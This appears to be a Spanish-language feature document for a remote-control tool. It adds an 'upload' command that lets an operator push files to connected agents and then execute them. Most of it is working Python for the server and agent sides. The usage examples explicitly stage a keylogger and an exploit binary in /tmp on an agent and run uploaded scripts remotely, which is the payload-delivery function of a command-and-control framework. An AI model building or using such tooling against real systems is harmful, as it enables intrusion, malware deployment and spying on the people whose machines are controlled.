# 📤 Feature: Upload de Archivos

## Descripción
Permite al operador subir archivos desde el servidor al agente.

---

## Uso

### Desde el servidor:
```
> upload agent-0930a3 /home/jose/script.py /tmp/script.py
```

### Parámetros:
- `agent_id`: ID del agente destino
- `local_path`: Ruta del archivo en el servidor
- `remote_path`: Ruta donde guardar en el agente

---

## Implementación

### Cambios en server.py:

```python
# En operator_console(), agregar:
elif line.startswith("upload "):
    parts = line.split(" ", 3)
    if len(parts) < 4:
        print("Uso: upload <agent_id> <archivo_local> <ruta_remota>")
        continue
    
    _, agent_id, local_path, remote_path = parts
    
    # Leer archivo local
    try:
        with open(local_path, "rb") as f:
            file_data = f.read()
        
        # Codificar en base64
        import base64
        file_b64 = base64.b64encode(file_data).decode()
        
        # Enviar al agente
        with agents_lock:
            conn = agents.get(agent_id)
        
        if not conn:
            print(f"Agente '{agent_id}' no encontrado")
            continue
        
        msg_id = str(uuid.uuid4())[:8]
        send_json(conn, {
            "type": "upload",
            "id": msg_id,
            "path": remote_path,
            "data": file_b64,
        })
        print(f"[enviado] Subiendo {local_path} → {remote_path} ({len(file_data)} bytes)")
    
    except FileNotFoundError:
        print(f"Archivo local no encontrado: {local_path}")
    except Exception as e:
        print(f"Error: {e}")
```

### Cambios en agent.py:

```python
# En el loop principal, agregar case para "upload":
if msg.get("type") == "upload":
    file_path = msg.get("path")
    file_data_b64 = msg.get("data")
    msg_id = msg.get("id")
    
    try:
        # Decodificar base64
        import base64
        file_data = base64.b64decode(file_data_b64)
        
        # Escribir archivo
        with open(file_path, "wb") as f:
            f.write(file_data)
        
        # Responder éxito
        send_json(sock, {
            "type": "result",
            "id": msg_id,
            "agent_id": AGENT_ID,
            "output": f"Archivo guardado: {file_path} ({len(file_data)} bytes)",
            "status": "ok",
        })
        print(f"[archivo recibido] {file_path} ({len(file_data)} bytes)")
    
    except Exception as e:
        send_json(sock, {
            "type": "result",
            "id": msg_id,
            "agent_id": AGENT_ID,
            "output": f"Error al guardar archivo: {e}",
            "status": "error",
        })
```

---

## Ventajas

- ✅ Sube archivos binarios (no solo texto)
- ✅ Funciona con cualquier tipo de archivo
- ✅ Verifica que se subió correctamente
- ✅ Más limpio que usar comandos shell

---

## Limitaciones

- ⚠️ Archivos grandes (>10MB) pueden ser lentos
- ⚠️ Base64 aumenta tamaño 33%
- 💡 Solución futura: Chunking para archivos grandes

---

## Ejemplos de Uso

### Subir script Python:
```
upload agent-0930a3 /home/jose/keylogger.py /tmp/keylogger.py
```

### Subir binario:
```
upload agent-0930a3 /home/jose/exploit.bin /tmp/exploit.bin
```

### Subir y ejecutar:
```
upload agent-0930a3 /home/jose/script.py /tmp/script.py
use agent-0930a3 python3 /tmp/script.py
```

---

## Testing

```bash
# 1. Crear archivo de prueba
echo "print('Hello from uploaded script')" > /tmp/test.py

# 2. Subir al agente
upload agent-0930a3 /tmp/test.py /tmp/uploaded.py

# 3. Ejecutar
use agent-0930a3 python3 /tmp/uploaded.py

# Salida esperada:
[resultado] Hello from uploaded script
```
